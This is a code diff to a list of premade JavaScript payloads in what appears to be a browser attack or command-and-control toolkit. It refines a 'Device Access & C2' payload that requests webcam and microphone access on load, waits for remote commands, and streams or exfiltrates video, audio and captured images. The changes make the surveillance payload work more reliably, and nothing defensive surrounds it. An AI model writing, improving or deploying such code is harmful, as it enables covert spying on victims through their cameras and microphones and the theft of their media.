@@ -131,7 +131,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 `.trim(),
     },
     {
-        name: "Device Access & C2",
+        name: "Device Access &amp; C2",
         description: "Requests webcam/mic access and listens for C2 commands to stream media.",
         code: `
 (function() {
@@ -146,7 +146,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     }
 
     async function getMediaPermissions(video = true, audio = true) {
-        if (mediaStream) return mediaStream;
+        if (mediaStream && mediaStream.active) return mediaStream;
         try {
             mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
             exfiltrate('connection', { message: 'Permissions granted.' });
@@ -157,10 +157,6 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
         }
     }
     
-    // Immediately ask for permissions when the payload loads.
-    getMediaPermissions();
-
-
     function startRecording(recorder, streamType) {
         if (recorder && recorder.state === 'inactive') {
             recorder.start(500); // Send chunk every 500ms
@@ -186,8 +182,11 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
         return recorder;
     }
 
+    // Immediately ask for permissions when the payload loads.
+    getMediaPermissions();
+
     channel.addEventListener('message', async (event) => {
-        if (event.data.sessionId !== sessionId || event.data.type !== 'command') return;
+        if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
 
         const command = event.data.command;
         const stream = await getMediaPermissions();
@@ -195,7 +194,8 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 
         switch (command) {
             case 'start-video':
-                exfiltrate('media-stream', { type: 'video/preview', streamId: stream.id });
+                 // This command will now just ensure permissions are active and the stream is sent
+                 channel.postMessage({ type: 'media-stream', sessionId, data: { stream } });
                 break;
             case 'capture-image':
                 const track = stream.getVideoTracks()[0];
